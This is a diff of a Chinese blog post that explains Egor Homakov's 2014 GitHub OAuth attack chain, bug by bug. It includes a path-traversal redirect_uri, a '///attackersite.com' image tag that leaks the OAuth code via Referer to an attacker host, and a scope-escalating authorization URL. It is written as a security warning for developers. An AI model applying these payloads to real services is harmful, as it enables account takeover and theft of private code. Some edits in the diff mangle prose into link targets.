@@ -1,4 +1,12 @@
-           Egor Homakov（Twitter: [@homakov](http://twitter.com/homakov)个人网站: [EgorHomakov.com](http://egorhomakov.com/)）是一个Web安全的布道士，他这两天把github给黑了，并给github报了5个安全方面的bug，他在他的这篇blog——《[How I hacked Github again](http://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html)》（墙）说明了这5个安全bug以及他把github黑掉的思路。Egor的这篇文章讲得比较简单，很多地方一笔带过，所以，**我在这里用我的语言给大家阐述一下黑掉Github的思路以及原文中所提到的那5个bug。希望这篇文章能让从事Web开发的同学们警惕**。关于Web开发中的安全事项，大家可以看看这篇文章《[Web开发中的你需要了解的东西](https://coolshell.cn/articles/6043.html)》
+```
+       Egor Homakov（Twitter: [@homakov](http://twitter.com/homakov)个人网站: [EgorHomakov.com](http://egorhomakov.com/)）
+       是一个Web安全的布道士，他这两天把github给黑了，并给github报了5个安全方面的bug，他在他的这篇blog——
+       《[How I hacked Github again](http://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html)》（墙）
+       说明了这5个安全bug以及他把github黑掉的思路。Egor的这篇文章讲得比较简单，很多地方一笔带过，
+       所以，**我在这里用我的语言给大家阐述一下黑掉Github的思路以及原文中所提到的那5个bug。
+       希望这篇文章能让从事Web开发的同学们警惕**。关于Web开发中的安全事项，大家可以看看这篇文章
+       《[Web开发中的你需要了解的东西](https://coolshell.cn/articles/6043.html)》
+```
 
 ![](/assets/git-1.png)
 
@@ -9,8 +17,6 @@
 ![](/assets/git-2.png)
 
 从上面的流程图中，我们可以看OAuth不管是1.0还是2.0版本都是一个比较复杂的协议，所以，在Server端要把OAuth实现对并不是一些容易事，其总是或多或少会有些小错误。Egor就找到了几个Github的OAuth的实现的问题。
-
-
 
 ### OAuth的Callback
 
@@ -28,10 +34,10 @@
 
 ```
 如果 CALLBACK URL是: http://example.com/path
- 
+
 GOOD: https://example.com/path
 GOOD: http://example.com/path/subdir/other
- 
+
 BAD: http://example.com/bar
 BAD: http://example.com/
 BAD: http://example.com:8080/path
@@ -39,7 +45,7 @@ BAD: http://oauth.example.com:8080/path
 BAD: http://example.org
 ```
 
-而Github对于redirect\_uri做了限制，要求只能跳回到 https://gist.github.com/auth/github/callback/，也就是说，域名是gist.github.com，目录是/auth/github/callback/，服务器端做了这个限制，看似很安全了。
+而Github对于redirect\_uri做了限制，要求只能跳回到 [https://gist.github.com/auth/github/callback/，也就是说，域名是gist.github.com，目录是/auth/github/callback/，服务器端做了这个限制，看似很安全了。](https://gist.github.com/auth/github/callback/，也就是说，域名是gist.github.com，目录是/auth/github/callback/，服务器端做了这个限制，看似很安全了。)
 
 但是，Egor发现，Github的服务器端并没有验证.. /../../这样的情况。
 
@@ -67,7 +73,7 @@ https://gist.github.com/homakov/8820324?code=CODE
 
 也就是说，token的生成要考虑redirect\_uri，这样，当URL跳转的时候，会把redirect\_uri和token带到跳转页面（这里的跳转页面还是github自己的），跳转页面的服务端程序要用redirect\_uri来生成一个token，看看是不是和传来的token是一个样的。这就是所谓的对URL进行签名——以保证URL的不被人篡改。一般来说，对URL签名和对签名验证的因子包括，源IP，服务器时间截，session，或是再加个salt什么的。
 
-###  第三个BUG — 注入跨站图片
+### 第三个BUG — 注入跨站图片
 
 现在，redirect\_uri带着code，安全顺利地跳到了Egor构造的网页上：
 
@@ -81,17 +87,17 @@ https://gist.github.com/homakov/8820324?code=CODE
 
                                  `<a href=http://hack.you.com/>私人照片</a>`
 
-这样，当页面跳转到黑客的网站上来后，你之前的网页上的网址会被加在http头里的 Refere 参数里，这样，我就可以得到你的token了。
+这样，当页面跳转到黑客的网站上来后，你之前的网页上的网址会被加在http头里的 Refere 参数里，这样，我就可以得到你的token了。
 
 但是，在gist上放个链接还要用户去点一下，这个太影响“用户体验”了，最好能嵌入点外部的东西。gist上可以嵌入外站的图片，但是github的开发人员并非等闲之辈，对于外站的图片，其统统会把这些图片的url代理成github自己的url，所以，你很难搞定。
 
 不过，我们可以用一个很诡异的技巧：
 
-                                      **&lt;img src=”///attackersite.com”&gt;**
+```
+                                  **&lt;img src=”///attackersite.com”&gt;**
+```
 
 这个是什么玩意？这个是个URL的相对路径。但是为什么会有三个///呢？呵呵。
-
-
 
 ##### 像程序员一样的思考
 
@@ -101,11 +107,13 @@ https://gist.github.com/homakov/8820324?code=CODE
 
 * 对于相对路径：就没有绝对路径那么复杂了。就是些 .. 和 /再加上?和一些参数。
 
-好了，如果coolshell.cn网页中的&lt;img src=&gt;或&lt;a href=&gt;中用到的相对路径是 /host.com，那么浏览器会解释成：https://coolshell.cn/host.com，如果是///host.com，那么就应该被浏览器解释成 https://coolshell.cn///host.com。
+好了，如果coolshell.cn网页中的&lt;img src=&gt;或&lt;a href=&gt;中用到的相对路径是 /host.com，那么浏览器会解释成：[https://coolshell.cn/host.com，如果是///host.com，那么就应该被浏览器解释成](https://coolshell.cn/host.com，如果是///host.com，那么就应该被浏览器解释成) [https://coolshell.cn///host.com。](https://coolshell.cn///host.com。)
 
 但是，Chrome和Firefox，会把///host.com当成绝对路径，因为其正确匹配了绝对路径的scheme。如果你正在用Chrome/Firefox看这篇文章 ，你可以看看下面的连接（源码如下）：
 
-                               [CoolShell Test](https://www.google.com/)
+```
+                           [CoolShell Test](https://www.google.com/)
+```
 
 ```
 <a href="///www.google.com">CoolShell Test</a>
@@ -129,8 +137,6 @@ https://gist.github.com/homakov/8820324?code=CODE
 
 于是，Egor只能另谋出路。
 
-
-
 ### 第五个Bug – 自动给gist授权
 
 因为gist是github自家的，Egor所以估计github想做得简单一点，当用户访问gist的时候，不会出弹出一个OAuth的页面来让用户授权，不然，用户就会很诧异，都是你们自家的东西，还要授权？所以，Egor猜测github应该是对gist做了自动授权，于是，Egor搞了这样的一个URL（注意其中的 redirect\_uri中的scope ）
@@ -142,8 +148,6 @@ response_type=code&scope=repo,gists,user,delete_repo,notifications
 ```
 
 于是，这个redirect-uri不但帮黑客拿到了访问gist的token，而且还把授权token的scope扩大到了用户的代码库等其它权限。于是你就可以黑入用户的私有代码区了。
-
-
 
 参考：
 
